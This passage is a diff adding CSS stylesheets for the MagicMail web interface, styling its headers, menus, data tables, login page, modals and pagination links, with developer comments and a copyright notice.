+#MainHeaderTable td {
+    padding: 0px;
+    margin: 0px;
+}
+
+#MainHeaderTable td.nopad a.nopad {
+    float: right;
+    margin: -1px 0 0;
+}
+
+#MainHeaderTable td.nopad a:hover.nopad {
+    cursor: pointer;
+    filter: alpha(opacity=80);
+    opacity: 0.8;
+}
+
+/* Admin Interface specific */
+.CustomHeaderTable {
+    background: #FFF url('/images/1px_black_top.png') repeat-x top left;
+    border: 0;
+    height: 104px;
+    margin: 0;
+    padding: 0;
+    width: 100%;
+}
+
+.CustomHeaderTable td {
+    margin: 0;
+    padding: 0;
+    font-size: 0; /* IE Fix */
+}
+
+#AdminSubHeaderRow {
+    background: #FFF url(/images/1px_grey_top.png) repeat-x;
+}
+
+/* Merge the two names below? */
+#MainHeaderSubMenu {
+    background: url(/images/background-sub.gif) no-repeat;
+    font-size: 10px;
+    height: 20px;
+}
+
+#CustomHeaderSubMenu {
+    text-align: right;
+    padding-top: 1px;
+    background: url(/images/sub_menu_left.png) no-repeat;
+    font-size: 11px;
+    line-height: 1.5em;
+}
+
+/* Smaller table to hold company logo, and login/help buttons in header, floats right */
+#header-table {
+    border-spacing: 0;
+    border-collapse: collapse;
+}
+
+#header-table td {
+    text-align: right !important;
+    padding: 0px;
+    margin: 0px;
+}
+
+/*Logout button*/
+.MagicNavTab {
+    background-color: #555855;
+    border-radius: 8px 8px 0px 0px;
+    overflow: hidden;
+    width: 100px;
+    height: 28px;
+    text-align: center;
+    vertical-align: bottom;
+    font-size: 1.4em;
+    color: #FFF;
+    float: right;
+}
+.MagicNavTab a {
+    color: #FFF;
+    transition: .2s;
+    text-decoration: none;
+    display: flex;
+    width: 100%;
+    height: 100%;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Think this is only used in admin interface now, but keep around */
+#MainHeaderSubMenu a {
+    color: #000;
+}
+
+#MainHeaderSubMenu a:hover {
+    color: #10456B;
+}
+
+/* Admin Interface, this is called AdminSubHeaderRow */
+#UserSubHeaderRow {
+    background: #FFF url(/images/1px_grey_top.png) repeat-x;
+}
+
+#MainHeaderSubMenu {
+    text-align: right;
+    padding-top: 1px;
+    background: url(/images/sub_menu_left.png) no-repeat;
+    font-size: 11px;
+    line-height: 1.5em;
+}
+
+/* This is what it is called in the admin interface */
+.MagicLeftMenuCell {
+    background: url('/images/clearleft_menu_1px.png') repeat-y top left;
+    margin: 0;
+    padding: 10px 0px 15px 25px;
+    min-height: 300px;
+    width: 200px;
+    font: 12px Verdana, Arial, Helvetica, sans-serif !important;
+}
+
+#loggedinas {
+    background: #FFF;
+    border: 2px solid #10456B;
+    font-size: .9em;
+    overflow: hidden;
+    text-align: center;
+    padding: 6px;
+    width: 160px;
+}
+
+#loggedinas strong {
+    color: #10456B;
+}
+
+.sideerror {
+    background: #FFF;
+    border: 2px solid #A00;
+    color: #840000;
+    font-weight: bold;
+    margin: 13px 0;
+    text-align: center;
+    width: 175px;
+    font-size: 0.9em;
+    padding: 4px !important;
+}
+
+/* Main Menu, common to Admin and User Interfaces */
+#MagicMenu {
+    width: 200px;
+}
+
+/* MP: Why is this here? */
+#Sidebar h4 em {
+    display: none;
+}
+
+#MagicMenu ul {
+    list-style: none;
+    margin-left: 5px;
+}
+
+#MagicMenu ul li {
+    border-bottom: 1px solid #AAA;
+    color: #000;
+    margin: 0;
+    padding: 0;
+    text-decoration: none;
+}
+
+#MagicMenu ul > li {
+    height: auto;
+}
+
+/* Deprecated, but might be useful in the future */
+#MagicMenu .dash {
+    display: none;
+}
+
+#MagicMenu ul li a {
+    color: #000;
+    display: block;
+    height: 26px;
+    line-height: 26px;
+    padding-left: 25px;
+    text-decoration: none;
+    min-height: 18px;
+}
+
+#MagicMenu ul li a:hover {
+    background-color: #EEE;
+    color: #10456B;
+}
+
+#MagicMenu ul.subMenu li {
+    border-bottom: 0;
+}
+
+#MagicMenu ul.subMenu li:not(:first-child) {
+    border-top: 1px solid #AAA;
+}
+
+#MagicMenu ul.subMenu .dash {
+    display: none;
+}
+
+/* hide image backgrounds for submenu items */
+#MagicMenu ul.subMenu li a, #MagicMenu ul.SubMenu li a:hover {
+    background: none;
+}
+
+#MagicMenu ul.subMenu li a {
+    color: #444;
+    display: block;
+    height: 20px;
+    line-height: 20px;
+    padding: 0 0 0 23px;
+    margin: 0;
+    font-size: 11px;
+    text-decoration: none;
+}
+
+#MagicMenu ul.subMenu a:hover {
+        color: #10456B;
+}
+
+#MagicMenu ul.subMenu li.active a {
+    color: #10456B;
+}
+
+/* Only used in admin, but logical to have same behavior across the board */
+.selectedMenuItem {
+    color: #498AB2 !important;
+}
+
+.selectedMenuItem:hover {
+    color: #10456B!important;
+}
+
+/* Spam Count, Only used in the login page */
+#MagicSpamCount {
+    width: 174px;
+}
+
+p#HelpMsg {
+    background: #999;
+    color: #FFF;
+    font-size: 0.9em;
+    margin: 0px;
+    padding: 6px;
+    text-align: center;
+}
+
+p#HelpMsg:hover {
+    cursor: help;
+}
+
+#MagicSpamCount #MailSummary {
+    background: #F2F2F2;
+    border: 1px solid #444;
+    margin: 15px auto 0;
+    width: 100%;
+}
+
+#MailSummary h4 {
+    background: #999;
+    border-bottom: 1px solid #555;
+    border-top: none;
+    color: #FFF;
+    font-weight: bold;
+    margin: 0;
+    padding: 3px;
+    text-align: center;
+    font-size: 10pt;
+}
+
+#MailSummary p {
+    font-size: 12px;
+    margin: 5px;
+    text-align: center;
+}
+
+#MailSummary p span {
+    display: block;
+    margin: .5em 0;
+}
+
+/* Powered By */
+#PoweredBy {
+    margin: 8px 0;
+    text-align: center;
+    width: 175px;
+}
+
+/* Page Content */
+.MagicContentCell {
+    background-color: #ffffff;
+    padding-left: 0;
+    padding: 15px 15px 15px 20px;
+    text-align: left;
+}
+
+.MagicContentCell {
+    vertical-align: top;
+}
+
+.MagicContentCell p {
+    margin: 8px 0;
+}
+
+.MagicContentCell .main_wiz p,
+.MagicContentCell p {
+    font-size: 1em;
+}
+
+#Promo {
+    margin: 40px auto 20px;
+}
+
+/* MP: Is this even used any more? Maybe Admin */
+#Footer {
+    width: 100%;
+    margin: 20px auto 0;
+    padding-top: 10px;
+    clear: both;
+    border-top: solid 1px #cdcdcd;
+    background-color: #18598B;
+}
+
+.SubmitButton {
+    margin-top: 10px;
+    text-align: right;
+}
+
+/* used with the printNoticePage function, functions.php */
+.pagenotice {
+    background: #FFF;
+    border: 2px solid red;
+    padding: 1em;
+}
+
+.pagenotice br {
+    display: none;
+}
+
+/* tooltip 'hover' stuff. */
+.Tooltip {
+    background: #FCFCFC;
+    border: 1px solid #DDD;
+    filter: alpha(opacity=90);
+    font-size: 12px;
+    line-height: 18px;
+    width: 250px;
+    -moz-border-radius: 5%;
+    -moz-opacity: 0.90;
+    padding: 10px;
+    text-align: left;
+    display: none;
+    z-index: 99;
+}
+
+p.Tooltip {
+   background-color: #ffffb3;
+   border: 1px solid #dddddd;
+   border-radius: 5%;
+   color: #222;
+   display: none;
+   font-size: 12px;
+   line-height: 1.2em;
+   margin: 0;
+   padding: 10px !important;
+   white-space: normal;
+   width: 250px;
+   text-align: center;
+   z-index: 10;
+}
+
+/* Used in admin and user interface */
+.MagicEmailList {
+    word-break: break-all;
+    word-wrap: break-word;
+    padding-right: 20px;
+}
+
+/* styles from admin/magicmail.css */
+/* MP MagicDataTable is for stacking tables, slowly being replaced by divs' */
+/* Only used in the user interface in the following:
+   modules/quarantine.php
+   js/forgot_password.js
+   Heavily used in the admin interface
+*/
+
+table.MagicDataTable {
+    border: 1px solid #999;
+    border-spacing: 0px;
+    border-radius: 4px;
+    -moz-border-radius: 4px;
+    -webkit-border-radius: 4px;
+    margin-bottom: 8px !important;
+    padding: 0;
+    width: 100% !important;
+    overflow: hidden;
+}
+
+table.MagicDataTable tr {
+    min-height: 1.1em;
+}
+
+/* The following is legacy, Bryan suggests that we make it look differently */
+table.MagicDataTable tr.header {
+    border-bottom: 1px solid #999;
+    color: #343434;
+    padding: 0;
+}
+
+/*
+ * extra_icon_space is a specific class for the domains list 
+ * to add icons depending their status 
+ */
+table.extra_icon_space tbody .hosted_domain td:last-child {
+    min-width: 161px;
+    white-space: nowrap;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child .health_icon {
+    background: url(/images/unknown_health_icon.png);
+    background-size: 100%;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child .alert_icon {
+    background: url(/images/icon-warning.png);
+    background-size: 100%;
+}
+table.extra_icon_space tbody .hosted_domain td:last-child span {
+    background-size: 100%;
+    width: 13px;
+    height: 11px;
+    display: inline-block;
+    background-repeat: no-repeat;
+    margin-left: 5px;
+    position: relative;
+    top: 2;
+}
+
+/* We can do that by setting the th header class as follows:
+   Only problem, we have to get rid of hard coded per table
+   rules currently in place, eg #EmailOptions */
+table.MagicDataTable tr.header th {
+    text-align: center;
+    height: 30px;
+    font-size: 1.1em;
+    font-weight: bold;
+    line-height: 1.3em;
+    vertical-align: bottom;
+    padding-bottom: 5px;
+    color: #00567b;
+    background-image: linear-gradient(to bottom, #FFF, #e6e7e8);
+}
+
+/* This is to replace the use of ul's in table headers,
+   and replace with
+    <span class='tableHeaderHelpIconLeft' onClick=\"javascript:showHelp('emailoption_aliases')\"><span>
+    <span class='tableTitleHelpIconLeft'>Some Title</span>
+*/
+.tableHeaderHelpIconLeft {
+    cursor: help;
+    background: url(/images/question_icon.svg) no-repeat;
+    background-position: top;
+    width: 16px;
+    height: 16px;
+    margin-left: 8px;
+    overflow: hidden;
+    float: left;
+}
+
+.tableHeaderHelpIconRight {
+    cursor: help;
+    background: url(/images/question_icon.svg) no-repeat;
+    background-position: top;
+    width: 16px;
+    height: 16px;
+    margin-right: 8px;
+    overflow: hidden;
+    float: right;
+}
+
+.tableTitleHelpIconLeft {
+    padding-right: 24px;
+}
+
+.tableTitleHelpIconRight {
+    padding-left: 24px;
+}
+
+.tableHeaderLinkRight {
+    float: right;
+    margin-right: 10px;
+}
+
+.tableHeaderLinkRight a {
+    text-decoration: none;
+}
+
+table.MagicDataTable tr.subHeader {
+    border-bottom: 1px solid #999;
+    color: #343434;
+}
+
+table.MagicDataTable tr.header th, tr.subHeader th {
+    border-bottom: 1px solid #999;
+    font-weight: bold;
+    line-height: 18px;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul {
+    border-radius: 4px;
+    height: 18px;
+    list-style: outside none none;
+    margin: 0;
+    padding: 2px 0;
+    position: relative;
+    text-align: center;
+    width: auto;
+}
+
+table.MagicDataTable tr.subHeaderDark {
+    background: #848484 url("/images/subheader.gif") repeat-x scroll 0 0;
+    color: #ffffff;
+}
+
+table.MagicDatable tr.subHeaderDark th a {
+    color: #ffffff;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li {
+    display: inline;
+    padding: 0;
+    text-align: left;
+    text-indent: 22px;
+    white-space: nowrap;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li.helplink a {
+    background: rgba(0, 0, 0, 0) url("/images/helpicon.gif") no-repeat scroll 0 0;
+    border: 0 none;
+    cursor: help;
+    display: block;
+    font-size: 0;
+    height: 12px;
+    padding: 0;
+    width: 12px;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li a:link {
+    text-decoration: none;
+}
+
+/* Deprecate */
+table.MagicDataTable th ul li.helplink a:hover {
+    opacity: 0.7;
+}
+
+/* While all subHeaders should use th, some td's still exist */
+table.MagicDataTable tr.subHeader td {
+   font-weight: bold;
+   font-size: 1.1em;
+   padding: 3px 6px;
+}
+
+table.MagicDataTable td {
+    /* Technically, this should be a separate class */
+    border-bottom: 1px solid #dbdbdb;
+
+    padding: 3px 6px;
+
+    /* Override OuterTable definition */
+    vertical-align: baseline;
+}
+
+table.MagicDataTable td label {
+    display: inline-block;
+    padding-top: 0.8em;
+}
+
+.roomyrow {
+    line-height: 28px;
+}
+
+table.MagicDataTable tr.even {
+    background: #dedfde none repeat scroll 0 0;
+}
+
+table.MagicDataTable td .minibutton a {
+    color: #2951a5;
+    font-weight: normal;
+}
+
+td.success {
+    border: 2px solid #008800 !important
+}
+
+td.error {
+    border: 2px solid #990000 !important;
+}
+
+table.MagicDataTable tr.success td {
+    background: rgba(0, 0, 0, 0) url("/images/icon-success.png") no-repeat scroll 0 0;
+    padding-left: 20px;
+}
+
+table.MagicDataTable tr.error td {
+    background: rgba(0, 0, 0, 0) url("/images/icon-warning.png") no-repeat scroll 0 0;
+    padding-left: 20px;
+}
+
+table.MagicDataTable tr.subHeader th {
+    vertical-align: top;
+}
+
+table.MagicDataTable tr.subHeader.subHeaderDark th a {
+    color:white;
+    font-weight:normal;
+    padding:5;
+}
+
+table.MagicDataTable tr.subHeader th.checkcell a {
+    padding: 0px;
+}
+
+table.MagicDataTable .success {
+    text-align: center;
+    background-color: #88EE88;
+    border: 2px solid #008800;
+    font-weight: bold;
+    overflow: hidden;
+}
+
+table.MagicDataTable .error {
+    text-align: center;
+    border: 2px #990000 solid;
+    background-color: #FFCCD7;
+    font-weight: bold;
+}
+
+table.MagicDataTable .warning {
+    text-align: center;
+    border: 2px #b69508 solid;
+    background-color: #F0D511;
+    font-weight: bold;
+}
+
+/* LoginAlertBox, designed to be only loaded/shown on first login in */
+/* See example usage in MagicMail admin site for checking if the 'My Network IPs' file is updated */
+/* cat /etc/magic-mail/control/isp_owned_ranges */
+/* Possibly this is unique enough to go in page specific CSS files */
+div.postLoginAlert {
+    position: fixed;
+    width: 250px;
+    height: 300px;
+    right: 100px;
+    bottom: 100px;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    -webkit-user-drag: element; /* Doens't work fo every browser, but helpful */
+    transition: opacity 1s ease-out;
+    background-color: #FFF;
+}
+
+div.postLoginAlert .header {
+    color: #FFF; /* muddiAqua */
+    background-color: #18558C;
+    height: 26px;
+    font-size: 2.0em;
+    font-style: bold;
+    text-align: right;
+    vertical-align: center;
+    padding: 3px;
+    padding-right: 6px;
+}
+
+/* Experimental CSS Only trick to hide a div */
+div.postLoginAlert .main {
+    color: #000;
+    text-align: center;
+    padding-top: 1.0em;
+}
+
+div.postLoginAlert .main img {
+    margin: 5px;
+}
+
+div.postLoginAlert .hideMe {
+    cursor: pointer;
+}
+
+div.postLoginAlert .hideMe:focus + div.postLoginAlert > div {
+    display: none;
+}
+
+div.postLoginAlert .bigFont {
+    font-size: 2.0em;
+    color: #18558C;
+}
+
+div.postLoginAlert .regFont {
+    font-size: 0.9em;
+    padding: 5px;
+}
+
+div.postLoginAlert .bigNumber {
+    font-size: 1.5em;
+    color: #000;
+    display: block;
+    padding-top: 2px;
+}
+
+.multilist.select {
+    width: 250px;
+}
+
+.multilist.save {
+    width: 120px;
+}
+
+.multiListMiddleButtons {
+    width: 100px;
+}
+
+/* sliding toggle */
+.sliding-checkbox-center {
+    width: 75%;
+    margin: 0 auto;
+}
+
+.sliding-checkbox {
+    position: relative;
+    width: 50px;
+}
+
+.sliding-checkbox-checkbox {
+    display: none;
+}
+
+.sliding-checkbox-label {
+    display: block !important;
+    overflow: hidden; cursor: pointer;
+    border: 2px solid #999999; border-radius: 30px;
+    padding-top: 0em !important;
+}
+
+.sliding-checkbox.disabled .sliding-checkbox-label {
+    cursor: not-allowed;
+}
+
+.sliding-checkbox-inner {
+    display: block; width: 200%; margin-left: -100%;
+    transition: margin 0.3s ease-in 0s;
+}
+
+.sliding-checkbox-inner:before, .sliding-checkbox-inner:after {
+    display: block; float: left; width: 50%; padding: 0; line-height: 1.5;
+    font-size: 12px;
+    box-sizing: border-box;
+    border-radius: 30px;
+}
+
+.sliding-checkbox-inner:before {
+    content: "ON";
+    padding-left: 4px;
+    background-color: #22B24C; color: #FFFFFF;
+}
+
+.sliding-checkbox-inner:after {
+    content: "OFF";
+    padding-right: 4px;
+    background-color: red; color: #FFFFFF;
+    text-align: right;
+}
+
+.sliding-checkbox.disabled .sliding-checkbox-inner:before,
+.sliding-checkbox.disabled .sliding-checkbox-inner:after {
+    background-color: #EEEEEE;
+    color: #999999;
+}
+
+.sliding-checkbox-switch {
+    display: block; width: 20px; margin: 0px;
+    background: #FFFFFF;
+    border: 2px solid #999999; border-radius: 30px;
+    position: absolute; top: 0; bottom: 0; right: 30px;
+    transition: all 0.3s ease-in 0s; 
+    box-shadow: 0 1px 1px white inset;
+}
+
+.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-inner {
+    margin-left: 0;
+}
+
+.sliding-checkbox-checkbox:checked + .sliding-checkbox-label .sliding-checkbox-switch {
+    right: 0px; 
+}
+
+/*------------------------------------------*/
+/* Empty tables message */
+/*------------------------------------------*/
+tr td.empty_table span {
+    display: flex;
+    justify-content: center;
+    font-weight: bolder;
+    color: #18598c;
+    word-spacing: 4px;
+    letter-spacing: 4px;
+    cursor: default;
+    opacity: .3;
+    text-transform: uppercase;
+    font-size: 12px;
+    margin: 4px 0;
+}
+
+/*------------------------------------------*/
+/* normalized / common action button styles */
+/*------------------------------------------*/
+
+/* style for buttons on a table row */
+td.mm-table-action-buttons,
+ /* style for full width divs method */
+.mm-fw-div-action-buttons {
+    text-align: right;
+}
+
+/* ensure if there are multiple buttons, that they receive some gaps between */
+td.mm-table-action-buttons > * {
+    margin-left: 5px;
+}
+
+/* style for buttons in a non full width div (TODO: find a better way... float is evil) */
+.mm-nfw-div-action-buttons {
+    float: right;
+}
+
+/* style for flexed buttons... */
+.mm-fb-action-buttons {
+    display: flex;
+    justify-content: end;
+    gap: 5px;
+    padding-top: 10px;
+}
+
+.MagicContentCell {
+    background: none;
+    padding-top: 0px;
+}
+.MagicNavTab {
+    display: none;
+}
+#UserSubHeaderRow {
+    display: none;
+}
+#MainHeaderTable {
+    height: 130;
+    /* Make the grey gradient smaller during login */
+    background-image: linear-gradient(#fefefe 0, #e6e7e8 80%,#FFF 20%);
+}
+#loginContentCell {
+    margin: 0px 40px 20px 40px;
+    padding: 20px;
+    border-radius: 8px ;
+    -moz-border-radius: 8px ;
+    -webkit-border-radius: 8px ;
+    background: #FFF;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    transition: opacity 1s ease-out;
+    display: flex;
+}
+
+.login-info-content {
+    width: 350px;
+    margin-left: 20px;
+    margin-top: 20px;
+}
+/* The following two SHOULD be defaults */
+.login-info-content h2 {
+    font-size: 25px;
+}
+.login-info-content h4,
+#login-form-table h4 {
+    color: #10456B;
+    font-size: 1em;
+    font-weight: bold;
+}
+#login-form-table h4 {
+    text-align:center;
+}
+.login-info-content .main_wiz {
+    color: #000;
+    opacity: 0.7;
+}
+#login-form-wrapper {
+    margin-right: 20px;
+    margin-top: 20px;
+    width: 350px;
+    box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -moz-box-shadow: 3px 3px 5px 3px rgba(105,105,105,0.6);
+    -webkit-transition: opacity 1s ease-out;
+    transition: opacity 1s ease-out;
+    margin-left: 100px;
+    padding-bottom: 30px;
+}
+#login-form-table {
+    border: collapse;
+    border-spacing: 0;
+    width: 80%;
+    border: 0px;
+    margin: 0 auto;
+}
+#login-form-table th {
+    border: 0px 0px 0px 2px solid darkgrey;
+    background: none;
+    padding-top: 20px;
+    padding-bottom: 10px;
+}
+#login-form-table td {
+    display: block;
+    text-align: left;
+}
+#login-form-table tr td:first-child {
+    padding-top: 20px;
+}
+#login-form-table tr td:nth-child(2) {
+    padding-top: 5px;
+}
+#login-form-table tr:last-child {
+    text-align: right;
+}
+#login-form-table label {
+    font-size: .9em;
+}
+#login-form-table td.textright {
+    color: #000;
+    opacity: 0.7;
+}
+#login-form-table input {
+    padding: 0px;
+    margin: 0px;
+    font-size: 1.3em;
+    line-height: 1.4em;
+}
+#login-form-table input[type="submit"] {
+    text-align: right;
+    float: right;
+    border: 1px outset #10456B;
+    background: lightgrey;
+    padding: 5px 15px 5px 15px;
+    cursor: pointer;
+}
+/* Way to position to the adtrack insider the header */
+.adtrack-user-spot-a {
+    position: absolute;
+    top: 50px;
+    left: 380px;
+
+}
+/* Legacy id's from themes, are we to deprecate? */
+/* Also could be from landing.php as well */
+#recover-pass-td a {
+    display: inline-block;
+    padding-bottom: 5px;
+    text-decoration: none;
+}
+
+#login-error {
+    display: none;
+    position:absolute;
+    width:148px;
+    margin-top:4px;
+    font-weight:bold;
+}
+
+/* Login Page */
+#LoginWrapper {
+    margin: auto;
+    width: 620px;
+}
+
+#LoginInfo {
+    float: left;
+    width: 400px;
+    text-align: left;
+    font-size: 14px;
+    margin: 0;
+}
+#LoginInfo p {
+    margin-top: 8px;
+}
+
+.LoginBody {
+    background: #fff url('/images/background2.gif') repeat-x 0 0;
+}
+.LoginBody a {
+    text-decoration: none;
+}
+
+.LoginBody #PoweredBadge {
+    width: 100%;
+    text-align: center;
+    margin-top: 5px;
+}
+
+#login-form-table td.formFoot tr td {
+    display: table-cell;
+    padding-top: 0px;
+    vertical-align: middle;
+}
+
+/* There is some whitespace in the powered by image. Move it left so that the */
+/* actual image is in line with everything else */
+#login-form-table tr td.poweredBy img {
+    margin-left: -6px;
+}
+
+#login-form-table tr td.formFoot {
+    padding-top: 0px;
+}
+
+#login-form-table tr td.formFoot table {
+    width: 100%;
+}
+
+.LoginBody #Login {
+    padding: 5px 15px 0;
+}
+
+#Login {
+    width: 180px;
+    padding: 5px 15px 35px;
+    -moz-border-radius: 7px;
+    -webkit-border-radius: 7px;
+    border-radius: 7px;
+    border-top: 2px solid #ededed;
+    border-left: 2px solid #ededed;
+    border-right: 1px solid #cdcdcd;
+    border-bottom: 1px solid #cdcdcd;
+    background: #dedede;
+    margin-top: 50px;
+    float: left;
+}
+
+#Login a:hover {
+    border:none;
+}
+
+#LoginHeader h3 {
+    margin-bottom: 10px;
+    color: #10456B;
+}
+
+#login-form-table input[type="text"],
+#login-form-table input[type="email"],
+#login-form-table input[type="password"] {
+    border-top: 2px solid #cdcdcd;
+    border-left: 2px solid #cdcdcd;
+    border-bottom: 2px solid #ededed;
+    border-right: 2px solid #ededed;
+    -moz-border-radius: 5px;
+    -webkit-border-radius: 5px;
+    border-radius: 5px;
+    padding: 2px;
+    height: 1.5em;
+    width: 100%;
+}
+
+#login-form-table .show-password label {
+	display: block;
+	font-size: .8em;
+    margin-top: 10px;
+}
+
+
+#login-form-table .show-password input[type="checkbox"] {
+	vertical-align: bottom;
+  	position: relative;
+	font-size: .8em;
+}
+
+/* IE 10+ Detection (including MS Edge) */
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+    /*
+        For IE only, we won't have the email and password inputs below the
+        labels.  It doesn't seem to be possible to actually separate <td> tags
+        by newlines in IE like you can with other browsers with the
+        display: block. However, without doing anything, the inputs appear
+        higher up than the labels, so this margin top pushes the inputs down to
+        be inline with the labels
+     */
+    #login-form-table input[type="email"],
+    #login-form-table input[type="password"] {
+        margin-top: 10px;
+    }
+}
+
+#login-form-table input[type="email"]:focus,
+#login-form-table input[type="password"]:focus {
+    background:#ffedde;
+}
+
+/* For backward compatability let's hide this row
+.forgot-password-row {
+    display: none;
+}
+*/
+
+
+.login-modal-input {
+    display: flex;
+    align-items: end;
+    font-size: 15px;
+    margin: 10px 0 20px;
+}
+
+.login-modal-input input[type=checkbox]{
+    flex: none;
+    width: 25px;
+    height: 25px;
+} 
+
+#login-modal-buttons {
+    display: flex;
+    justify-content: space-around;
+}
+
+#login-modal-buttons input {
+    height: 50px;
+}
+
+
+
+/* The Modal (background) */
+.mm-modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    padding-top: 100px; /* Location of the box */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.mm-modal-content {
+    background-color: #fefefe;
+    margin: auto;
+    border: 1px solid #888;
+    width: 40%;
+    min-width: 670px;
+    overflow: scroll;
+}
+
+/* The Close Button */
+.mm-modal-close {
+    color: #aaaaaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.mm-modal-content {
+    border: 1px solid black;
+}
+
+.mm-modal-body {
+    padding: 10px;
+}
+
+.mm-modal-footer {
+    background-color: #eee;
+    padding: 10px;
+    text-align: right;
+}
+.mm-modal-header {
+    padding: 10px;
+    background-color: #eee;
+}
+
+.mm-modal-msg {
+    display: hidden;
+    padding: 10px;
+}
+
+.mm-modal-body ul {
+	padding-left: 11px;
+	font-size: 14px;
+}
+
+.mm-modal-close:hover,
+.mm-modalclose:focus {
+    color: #000;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.mm-modal-footer button {
+    position: relative;
+}
+
+#uncaught-spam-folder-modal .folder-content {
+    text-align: center;
+    font-size: 13px;
+}
+
+#uncaught-spam-folder-modal .folder-content {
+    text-align: center;
+    font-size: 13px;
+}
+
+/* Specific to admin interface, user.php */
+.mm-modal-header h2 {
+    margin-top: 6px;
+    margin-bottom: 2px;
+}
+/*
+ * COPYRIGHT INFORMATION - DO NOT REMOVE
+ *
+ * This file is part of the MagicMail (TM) Project and is
+ * Copyright (c) LinuxMagic Inc. 2019 All Rights Reserved
+ *
+ * This file contains Original Code as created by LinuxMagic Inc.
+ *
+ * The Original Code is distributed on an 'AS IS' basis,
+ * WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, AND LINUXMAGIC
+ * HEREBY DISCLAIMS ALL SUCH WARRANTIES, INCLUDING WITHOUT LIMITATION, ANY
+ * WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, QUIET
+ * ENJOYMENT OR NON-INFRINGEMENT.
+ *
+ * Do NOT download, distribute, use or alter this software or file in any
+ * way without express written permission from LinuxMagic Inc. or its parent
+ * company Wizard Tower TechnoServices signed by an authorized company officer.
+ *
+ * Author(s): Steven Hall <stevenh@linuxmagic.com>
+ *
+ * $Id:
+ */
+
+.pageLinks {
+    text-align: center;
+}
+form.pageLinks {
+    margin-top: 10px;
+}
+.pageLinkDigit {
+    color: #666;
+    text-align: center;
+}
+
+.pageLinks div,
+.pageLinks select,
+.pageLinks input {
+    border: 1px solid #ccc;
+    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
+    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
+    width: 30px;
+    box-sizing: border-box;
+    display: inline-block;
+    line-height: 21px;
+}
+
+.pageLinks select,
+.pageLinks input {
+    width: auto;
+}
+
+.pageLinks div:hover a,
+.pageLinks select:hover,
+.pageLinks input:hover {
+    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
+    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+}
+
+.pageLinkDigit:hover {
+    background: -moz-linear-gradient(top, #f7f7f7 0%, #e7ebe7 50%, #efebef 100%);
+    background: -webkit-linear-gradient(top, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    background: linear-gradient(to bottom, #f7f7f7 0%,#e7ebe7 50%,#efebef 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f7f7f7', endColorstr='#efebef',GradientType=0 );
+}
+
+.pageLinks div:first-child {
+    -webkit-border-top-left-radius: 3px;
+    -webkit-border-bottom-left-radius: 3px;
+    -moz-border-radius-topleft: 3px;
+    -moz-border-radius-bottomleft: 3px;
+    border-top-left-radius: 3px;
+    border-bottom-left-radius: 3px;
+    width: 45px;
+}
+
+
+.pageLinks div:last-child  {
+    -webkit-border-top-right-radius: 3px;
+    -webkit-border-bottom-right-radius: 3px;
+    -moz-border-radius-topright: 3px;
+    -moz-border-radius-bottomright: 3px;
+    border-top-right-radius: 3px;
+    border-bottom-right-radius: 3px;
+    width: 45px;
+}
+
+div.selectedPage {
+    background: -moz-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    background: -webkit-linear-gradient(top, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E6E6E6', endColorstr='#B8B8B8',GradientType=0 );
+    background: linear-gradient(to bottom, #E6E6E6 0%, #CBCCCB 50%, #B8B8B8 100%);
+    font-weight: bold;
+    color: #10456b;
+    width: 30px;
+    box-sizing: border-box;
+    text-align: center;
+}
+
+.pageLinkDigit a {
+    box-sizing: border-box;
+    color: #10456b;
+    display: inline-block;
+    text-decoration: none;
+    width: 100%;
+}
+
+select.pageLinkDigit,
+input.pageLinkDigit {
+    box-sizing: border-box;
+    color: #10456b;
+    display: inline-block;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.selectedPage {
+    line-height: 25px;
+}
+
+
+#loginContentCell {
+    display: flex;
